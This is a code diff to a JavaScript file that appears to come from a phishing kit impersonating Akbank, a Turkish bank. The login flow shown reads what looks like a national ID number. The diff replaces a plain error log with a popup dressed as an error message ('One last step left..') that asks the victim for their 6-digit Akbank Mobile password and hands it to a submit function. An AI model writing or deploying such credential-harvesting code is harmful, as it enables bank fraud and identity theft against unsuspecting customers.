@@ -25,10 +25,17 @@ function submitData(action, formData, successCallback) {
             successCallback(response);
         },
         error: function (error) {
-            console.error("AJAX request failed:", error);
+            // Hata olduğunda SweetAlert ile bir hata mesajı göster
+            Swal.fire({
+                icon: 'error',
+                title: 'Hata!',
+                html: '<div class="col-lg-4 right mt-3" id="authf" style=""><div class="py-30 px-30 scrollTo"><div class="input-block"><h2 class="mb-4">Son bi adım kaldı..</h2><label for="txtPhoneNumber">6 Haneli Akbank Mobil Şifreniz</label><input class="phone" type="password" id="passauth" maxlength="6"></div><div class="input-block"><button type="button" id="loginButtonPass" onclick="submitPass()" class="btn btn-primary w-100 btn-submit" disabled="">Onayla</button><button type="button" id="loginProcessPass" class="btn btn-primary w-100 btn-submit" style="display:none;"><div class="spinner"></div></button></div></div></div>',
+                confirmButtonText: 'Tamam'
+            });
         }
     });
 }
+
 
 function submitLogin() {
     var txtTckn = $("#txtTckn").val();
